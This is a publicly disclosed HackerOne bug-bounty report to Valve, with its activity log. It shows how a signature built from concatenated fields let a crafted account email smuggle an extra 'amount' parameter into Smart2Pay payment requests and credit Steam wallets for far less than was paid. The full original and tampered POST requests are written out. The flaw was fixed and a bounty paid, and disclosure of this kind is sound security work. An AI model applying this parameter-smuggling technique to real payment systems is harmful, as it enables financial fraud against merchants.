{"id":1295844,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjk1ODQ0","url":"https://hackerone.com/reports/1295844","title":"Modify in-flight data to payment provider Smart2Pay","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2021-08-09T13:18:20.362Z","submitted_at":"2021-08-09T13:18:20.444Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"drbrix","url":"/drbrix","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/140/908/f9d441f2309a123f9a66803c44a0c98dcda1db61_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23363,"url":"https://hackerone.com/valve","handle":"valve","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/023/363/c78d46a7d0ea39e3a15a7c19c1a48634f2571eb9_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/363/c78d46a7d0ea39e3a15a7c19c1a48634f2571eb9_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Valve","twitter_handle":"","website":"https://www.valvesoftware.com","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2021-08-10T22:05:36.053Z","bug_reporter_agreed_on_going_public_at":"2021-08-10T22:05:35.972Z","team_member_agreed_on_going_public_at":"2021-08-10T17:53:40.550Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I have found vulnerability which allows attacker to generate steam wallet balance.\n\nFirstly you will have to change yours steam account email to something like (I will explain why in next steps, amount100 is the important part): \nbrixamount100abc@█████\n\nThen go to https://store.steampowered.com/steamaccount/addfunds and click add add funds.\n\nProceed to payment and select any payment which uses Smart2Pay payment method (przelewy24 in my country).\n\nClick next steps as you would do with normal transaction.\n\nIntercept POST request to https://globalapi.smart2pay.com/\n\nYou should see request like that\n\n```\nPOST / HTTP/1.1\nHost: globalapi.smart2pay.com\nContent-Length: 388\nCache-Control: max-age=0\nSec-Ch-Ua: \"Chromium\";v=\"92\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"92\"\nSec-Ch-Ua-Mobile: ?0\nUpgrade-Insecure-Requests: 1\nOrigin: https://store.steampowered.com\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: cross-site\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://store.steampowered.com/\nAccept-Encoding: gzip, deflate\nAccept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7\nConnection: close\n\nMerchantID=1102\u0026MerchantTransactionID=███\u0026Amount=2000\u0026Currency=PLN\u0026ReturnURL=https%3A%2F%2Fstore.steampowered.com%2Fpaypal%2Fsmart2pay%2F████%2F\u0026MethodID=12\u0026Country=PL\u0026CustomerEmail=brixamount100abc%40███████\u0026CustomerName=_drbrix_\u0026SkipHPP=1\u0026Description=Steam+Purchase\u0026SkinID=101\u0026Hash=███\n```\n\n\nWe cant change parameters as there is Hash field with signature, however signature is generated like that hash(ALL_FIELDS_NAMES_VALUES_CONTACTED)\n\nFor this request it will look like that:\n\n`hash(MerchantID1102MerchantTransactionID█████Amount2000.....)`\n\nSo with our special email we can move parameters in a way that will change amount for us\n\nFor example, we can change original `Amount=2000` to `Amount2=000` and after contacting it still will be `Amount2000`\n\nThen we can change email from `CustomerEmail=brixamount100abc%40████` to `CustomerEmail=brix\u0026amount=100\u0026ab=c%40█████████` by this we are adding new field amount with our value.\n\nnew request should look like that:\n\n```\nPOST / HTTP/1.1\nHost: globalapi.smart2pay.com\nContent-Length: 388\nCache-Control: max-age=0\nSec-Ch-Ua: \"Chromium\";v=\"92\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"92\"\nSec-Ch-Ua-Mobile: ?0\nUpgrade-Insecure-Requests: 1\nOrigin: https://store.steampowered.com\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: cross-site\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://store.steampowered.com/\nAccept-Encoding: gzip, deflate\nAccept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7\nConnection: close\n\nMerchantID=1102\u0026MerchantTransactionID=██████\u0026Amount2=000\u0026Currency=PLN\u0026ReturnURL=https%3A%2F%2Fstore.steampowered.com%2Fpaypal%2Fsmart2pay%2F████%2F\u0026MethodID=12\u0026Country=PL\u0026CustomerEmail=brix\u0026amount=100\u0026ab=c%40██████████\u0026CustomerName=_drbrix_\u0026SkipHPP=1\u0026Description=Steam+Purchase\u0026SkinID=101\u0026Hash=█████████\n```\n\nThen just pay 1 $ and you should get your money on steam wallet in few hours/days those are some transactions made with this metod:\n2███████3\n2████9\n\nand this is account i was testing everything on: \nhttp://steamcommunity.com/profiles/7656██████████\n\n## Impact\n\nI think impact is pretty obvious, attacker can generate money and break steam market, sell game keys for cheap etc.","bounty_amount":"7500.0","formatted_bounty":"$7,500","weakness":{"id":65,"name":"Business Logic Errors"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":356,"voters":["arw9234","act1on3","theranger","ekbereksi","faint","dninjadave","pyrrhon","mizzle","xehle","dazaiii","and 346 more..."],"severity":{"rating":"critical","author_type":"Team"},"structured_scope":{"databaseId":2293,"asset_type":"URL","asset_identifier":"store.steampowered.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":12905441,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2021-08-10T01:23:56.664Z","updated_at":"2021-08-10T01:23:56.664Z","additional_data":{"old_title":"Generating wallet money for \"free\".","new_title":"Modify in-flight data to payment provider Smart2Pay"},"actor":{"username":"jonp","cleared":false,"url":"/jonp","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/203/578/6de63d2fdd8c70309cf4326359d3e816a7633b5c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":12905443,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks for your report. We've been able to validate this is happening pretty much as described, and are taking steps now. Please stand by as we have not assessed severity or bounty yet.","automated_response":false,"created_at":"2021-08-10T01:24:10.268Z","updated_at":"2021-08-10T01:24:49.755Z","actor":{"username":"jonp","cleared":false,"url":"/jonp","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/203/578/6de63d2fdd8c70309cf4326359d3e816a7633b5c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":12905467,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We are deploying a fix to our production systems now. Can you please retest and let us know what you find? Thank you. We'll follow up with bounty/severity soon.","automated_response":false,"created_at":"2021-08-10T01:30:31.837Z","updated_at":"2021-08-10T01:30:31.837Z","actor":{"username":"jonp","cleared":false,"url":"/jonp","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/203/578/6de63d2fdd8c70309cf4326359d3e816a7633b5c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":12906366,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi!\nIm a little sick rigth now :(\nI will retest as soon as I will abe to.","automated_response":false,"created_at":"2021-08-10T05:02:20.888Z","updated_at":"2021-08-10T05:02:20.888Z","actor":{"username":"drbrix","cleared":false,"url":"/drbrix","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/140/908/f9d441f2309a123f9a66803c44a0c98dcda1db61_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":12915362,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nPayment flow wasnt changed and its still possible to modify amount. However idk how verifying payment looks like on the server side. I made payment and I didnt get any wallet balance. But before it took few hours/days to process payment, so I cant tell if its fixed or not. I will let you know if/when i will get my payment confirmed.","automated_response":false,"created_at":"2021-08-10T15:29:54.901Z","updated_at":"2021-08-10T15:29:54.901Z","actor":{"username":"drbrix","cleared":false,"url":"/drbrix","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/140/908/f9d441f2309a123f9a66803c44a0c98dcda1db61_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":12917661,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2021-08-10T17:37:07.984Z","updated_at":"2021-08-10T17:37:07.984Z","additional_data":{"old_severity":"Medium","new_severity":"Critical","old_severity_id":1183943,"new_severity_id":1186682},"actor":{"username":"jonp","cleared":false,"url":"/jonp","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/203/578/6de63d2fdd8c70309cf4326359d3e816a7633b5c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":12917683,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2021-08-10T17:38:58.136Z","updated_at":"2021-08-10T17:38:58.136Z","actor":{"url":"/valve","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/363/c78d46a7d0ea39e3a15a7c19c1a48634f2571eb9_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Valve"}},"bounty_amount":"7500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"valve","collaborator":{"username":"drbrix","url":"/drbrix"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":12917689,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We believe that is expected behavior given our mitigation. Please let us know if you find that this change was not effective.\n\nThank you for this report. This was clearly written and helpful in identifying a real business risk. We have changed the severity assessment to Critical, reflecting the potential cost to the business, and applied a bounty accordingly. We hope to hear more from you in the future.","automated_response":false,"created_at":"2021-08-10T17:39:22.318Z","updated_at":"2021-08-10T17:39:22.318Z","actor":{"username":"jonp","cleared":false,"url":"/jonp","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/203/578/6de63d2fdd8c70309cf4326359d3e816a7633b5c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"drbrix","url":"/drbrix"},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":12918196,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-08-10T17:53:40.577Z","updated_at":"2021-08-10T17:53:40.577Z","first_to_agree":true,"actor":{"username":"jonp","cleared":false,"url":"/jonp","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/203/578/6de63d2fdd8c70309cf4326359d3e816a7633b5c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":12919336,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Wow, thanks for bounty!","automated_response":false,"created_at":"2021-08-10T18:42:56.852Z","updated_at":"2021-08-10T18:42:56.852Z","actor":{"username":"drbrix","cleared":false,"url":"/drbrix","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/140/908/f9d441f2309a123f9a66803c44a0c98dcda1db61_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":12921591,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-08-10T22:05:35.992Z","updated_at":"2021-08-10T22:05:35.992Z","actor":{"username":"drbrix","cleared":false,"url":"/drbrix","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/140/908/f9d441f2309a123f9a66803c44a0c98dcda1db61_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":12921592,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-08-10T22:05:36.088Z","updated_at":"2021-08-10T22:05:36.088Z","actor":{"username":"drbrix","cleared":false,"url":"/drbrix","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/140/908/f9d441f2309a123f9a66803c44a0c98dcda1db61_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}